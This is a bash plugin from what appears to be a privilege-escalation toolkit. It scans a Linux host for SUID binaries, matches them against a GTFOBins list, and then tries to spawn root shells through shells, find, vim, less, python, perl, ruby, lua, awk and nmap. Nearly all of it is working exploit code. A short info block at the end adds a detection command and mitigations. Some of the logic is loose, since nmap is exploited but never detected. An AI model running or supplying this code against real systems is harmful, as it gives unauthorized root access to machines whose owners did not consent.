#!/bin/bash
# SUID Exploit Plugin
PLUGIN_NAME="suid_exploit"
PLUGIN_VERSION="1.0.0"
PLUGIN_CVE="N/A"
PLUGIN_DESCRIPTION="SUID Binary Privilege Escalation via GTFOBins"

suid_exploit_detect() {
    log_message "Checking for exploitable SUID binaries..." "INFO"
    
    local gtfo_bins="bash|sh|zsh|dash|ash|csh|ksh|tcsh|find|vim|vi|view|less|more|man|nano|pico|awk|gawk|nawk|mawk|perl|python|python2|python3|ruby|php|lua|tar|zip|gzip|gunzip|unar|mount|umount|su|sudo|sudoedit|passwd|pkexec|systemctl|service|cron|crontab|at|atq|wget|curl|nc|netcat|ncat|socat|openssl|gdb|strace|ltrace|tcpdump|tshark|dumpcap|screen|tmux|tmate|expect|unbuffer|git|svn|cvs|hg|scp|sftp|ftp|smbclient|rpcclient|rlwrap|run-parts|chown|chmod|chgrp|dd|df"
    
    local suid_bins
    suid_bins=$(find / -type f -perm -4000 2>/dev/null | head -100)
    
    local found=0
    while IFS= read -r binary; do
        local bin_name
        bin_name=$(basename "$binary")
        if echo "$bin_name" | grep -qiE "^(${gtfo_bins})$"; then
            found=1
            break
        fi
    done <<< "$suid_bins"
    
    if [ $found -eq 1 ]; then
        log_message "Exploitable SUID binaries found" "WARNING"
        return 0
    fi
    
    log_message "No exploitable SUID binaries found" "INFO"
    return 1
}

suid_exploit_exploit() {
    log_message "Attempting SUID exploitation..." "INFO"
    
    if ! suid_exploit_detect; then
        return 1
    fi
    
    local suid_bins
    suid_bins=$(find / -type f -perm -4000 2>/dev/null)
    
    while IFS= read -r binary; do
        local bin_name
        bin_name=$(basename "$binary")
        
        case "$bin_name" in
            bash|sh|zsh|dash|ash|csh|ksh|tcsh)
                log_message "Trying SUID ${bin_name}..." "INFO"
                "$binary" -p -c "id" 2>/dev/null | grep -q "uid=0" && {
                    log_message "Got root via SUID ${bin_name}!" "SUCCESS"
                    "$binary" -p
                    return 0
                }
                ;;
            find)
                log_message "Trying SUID find..." "INFO"
                "$binary" . -exec /bin/sh -p \; -quit 2>/dev/null && {
                    log_message "Got root via SUID find!" "SUCCESS"
                    return 0
                }
                ;;
            vim|vi|view)
                log_message "Trying SUID vim..." "INFO"
                "$binary" -c ':! /bin/sh -p' -c ':q!' 2>/dev/null && {
                    log_message "Got root via SUID vim!" "SUCCESS"
                    return 0
                }
                ;;
            less|more)
                log_message "Trying SUID less..." "INFO"
                echo "!/bin/sh -p" | "$binary" 2>/dev/null && {
                    log_message "Got root via SUID less!" "SUCCESS"
                    return 0
                }
                ;;
            python*|python2*|python3*)
                log_message "Trying SUID python..." "INFO"
                "$binary" -c 'import os; os.execl("/bin/sh", "sh", "-p")' 2>/dev/null && {
                    log_message "Got root via SUID python!" "SUCCESS"
                    return 0
                }
                ;;
            perl)
                log_message "Trying SUID perl..." "INFO"
                "$binary" -e 'exec "/bin/sh", "-p"' 2>/dev/null && {
                    log_message "Got root via SUID perl!" "SUCCESS"
                    return 0
                }
                ;;
            ruby)
                log_message "Trying SUID ruby..." "INFO"
                "$binary" -e 'exec "/bin/sh", "-p"' 2>/dev/null && {
                    log_message "Got root via SUID ruby!" "SUCCESS"
                    return 0
                }
                ;;
            lua)
                log_message "Trying SUID lua..." "INFO"
                "$binary" -e 'os.execute("/bin/sh -p")' 2>/dev/null && {
                    log_message "Got root via SUID lua!" "SUCCESS"
                    return 0
                }
                ;;
            awk|gawk|nawk|mawk)
                log_message "Trying SUID awk..." "INFO"
                "$binary" 'BEGIN {system("/bin/sh -p")}' 2>/dev/null && {
                    log_message "Got root via SUID awk!" "SUCCESS"
                    return 0
                }
                ;;
            nmap)
                log_message "Trying SUID nmap..." "INFO"
                echo 'os.execute("/bin/sh -p")' | "$binary" --interactive 2>/dev/null && {
                    log_message "Got root via SUID nmap!" "SUCCESS"
                    return 0
                }
                ;;
        esac
    done <<< "$suid_bins"
    
    log_message "SUID exploitation failed" "WARNING"
    return 1
}

suid_exploit_info() {
    cat << 'EOFINFO'
SUID Binary Exploitation
========================
Exploitation of SUID binaries using GTFOBins techniques.
Many standard Unix utilities can be abused when they have
the SUID bit set.

Resources:
- GTFOBins: https://gtfobins.github.io/

Detection:
find / -type f -perm -4000 2>/dev/null

Mitigation:
- Remove unnecessary SUID bits
- Use sudo with restricted commands
EOFINFO
}
